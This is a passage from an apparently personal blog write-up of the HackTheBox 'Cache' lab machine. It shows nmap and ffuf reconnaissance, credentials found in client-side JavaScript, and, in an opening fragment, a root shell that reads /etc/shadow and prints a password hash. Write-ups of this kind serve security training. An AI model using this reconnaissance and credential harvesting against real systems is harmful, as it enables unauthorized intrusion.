cd root@ae6411b77a1e:~# cat root.txt cat root.txt 44f998eb5112e763883b6ae36279a432 root@ae6411b77a1e:~# cat /etc/shadow | grep root cat /etc/shadow | grep root root:$6$bWa.Lbnz$k0KbMyNbdOQRcY5pWuHM2bfkF5ek8c0CTNsi00qFHmp04NqcefCsIXZTdJgqToRar5zcEk5k8KFhbIomGB3Kb/:18178:0:99999:7::: ","wordCount":"3868","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/cache/cache.png","datePublished":"2020-10-10T19:09:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/cache/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Cache</h1><div class=post-description>Cache HackTheBox writeup</div><div class=post-meta><span title='2020-10-10 19:09:00 +0000 UTC'>October 10, 2020</span>&nbsp;·&nbsp;19 min&nbsp;·&nbsp;3868 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/medium/ class=post-tag title=medium>medium</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/cache/cache.png alt="Cache HackTheBox Machine"><p>Cache - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a><ul><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration--discovery>HTTP enumeration & discovery</a></li><li><a href=#http-exploitation-openemr-sqli>HTTP exploitation (OpenEMR): SQLi</a></li><li><a href=#http-exploitation-openemr-rce>HTTP exploitation (OpenEMR): RCE</a></li><li><a href=#privilege-escalation-of-machine--www-data-to-ash>Privilege Escalation of Machine : www-data to ash</a></li><li><a href=#privilege-escalation-of-machine--ash-to-luffy>Privilege Escalation of Machine : ash to luffy</a></li><li><a href=#privilege-escalation-of-machine--luffy-to-root>Privilege Escalation of Machine : luffy to root</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Cache</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/251>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pacman -S nmap lynx ffuf exploitdb metasploit sqlmap john docker
</span></span></code></pre></td></tr></table></div></div><h3 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>Quick <a href=https://nmap.org/>nmap</a> scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Fri Jun 12 13:19:40 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.188
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.188
</span></span><span class=line><span class=cl>Host is up (0.021s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
</span></span><span class=line><span class=cl>|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Cache
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Fri Jun 12 13:20:07 2020 -- 1 IP address (1 host up) scanned in 26.73 seconds
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s set the local domain in <code>/etc/hosts</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep cache
</span></span><span class=line><span class=cl>10.10.10.188 cache.htb
</span></span></code></pre></td></tr></table></div></div><h3 id=http-enumeration--discovery>HTTP enumeration & discovery<a hidden class=anchor aria-hidden=true href=#http-enumeration--discovery>#</a></h3><p>Let&rsquo;s see which pages are listed on the home page:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ lynx -dump -listonly -nonumbers http://cache.htb/index.html
</span></span><span class=line><span class=cl>http://cache.htb/index.html
</span></span><span class=line><span class=cl>http://cache.htb/news.html
</span></span><span class=line><span class=cl>http://cache.htb/contactus.html
</span></span><span class=line><span class=cl>http://cache.htb/login.html
</span></span><span class=line><span class=cl>http://cache.htb/author.html
</span></span></code></pre></td></tr></table></div></div><p>If we look at the source of <code>login.html</code> we can see this script is included:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;jquery/functionality.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>$</span><span class=p>(</span><span class=kd>function</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>error_correctPassword</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>error_username</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>checkCorrectPassword</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>Password</span> <span class=o>=</span> <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#password&#34;</span><span class=p>).</span><span class=nx>val</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>Password</span> <span class=o>!=</span> <span class=s1>&#39;H@v3_fun&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Password didn&#39;t Match&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>error_correctPassword</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>checkCorrectUsername</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>Username</span> <span class=o>=</span> <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#username&#34;</span><span class=p>).</span><span class=nx>val</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>Username</span> <span class=o>!=</span> <span class=s2>&#34;ash&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Username didn&#39;t Match&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>error_username</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#loginform&#34;</span><span class=p>).</span><span class=nx>submit</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>event</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* Act on the event */</span>
</span></span><span class=line><span class=cl>        <span class=nx>error_correctPassword</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>         <span class=nx>checkCorrectPassword</span><span class=p>();</span>
</span></span><span class=line><span class=cl>         <span class=nx>error_username</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>         <span class=nx>checkCorrectUsername</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>error_correctPassword</span> <span class=o>==</span> <span class=kc>false</span> <span class=o>&amp;&amp;</span> <span class=nx>error_username</span> <span class=o>==</span><span class=kc>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></td></tr></table></div></div><p>So the creds are:</p><ul><li>username: <code>ash</code></li><li>password: <code>H@v3_fun</code></li></ul><p>That let us access to <a href=http://cache.htb/net.html>http://cache.htb/net.html</a>, a page under construction.
This is just a troll.</p><p>At <a href=http://cache.htb/author.html>http://cache.htb/author.html</a>, the author is talking about another project:
<em>HMS</em>.</p><p><code>hms</code> page or directory don&rsquo;t exist; lets&rsquo; try to enumerate more with <a href=https://github.com/ffuf/ffuf>ffuf</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>cache</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>e</span> <span class=o>.</span><span class=n>txt</span><span class=p>,</span><span class=o>.</span><span class=n>html</span> <span class=o>-</span><span class=n>fc</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>1.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>cache</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Extensions</span>       <span class=p>:</span> <span class=o>.</span><span class=n>txt</span> <span class=o>.</span><span class=n>html</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>login</span><span class=o>.</span><span class=n>html</span>              <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>2421</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>389</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>106</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=o>.</span><span class=n>html</span>              <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>8193</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>902</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>339</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=o>.</span><span class=n>html</span>               <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>7231</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>948</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>100</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>author</span><span class=o>.</span><span class=n>html</span>             <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1522</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>180</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>68</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>.</span>                       <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>8193</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>902</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>339</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>contactus</span><span class=o>.</span><span class=n>html</span>          <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>2539</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>283</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>148</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>jquery</span>                  <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>951</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>65</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>17</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>net</span><span class=o>.</span><span class=n>html</span>                <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>290</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>23</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>19</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>114801</span><span class=o>/</span><span class=mi>114801</span><span class=p>]</span> <span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>1739</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>01</span><span class=p>:</span><span class=mi>06</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>That didn&rsquo;t gave us new pages. In fact guessing was required to find another
virtual host.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.188</span><span class=o>/</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>H</span> <span class=s1>&#39;Host: FUZZ.htb&#39;</span> <span class=o>-</span><span class=n>fs</span> <span class=mi>8193</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>1.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.188</span><span class=o>/</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Header</span>           <span class=p>:</span> <span class=n>Host</span><span class=p>:</span> <span class=n>FUZZ</span><span class=o>.</span><span class=n>htb</span>
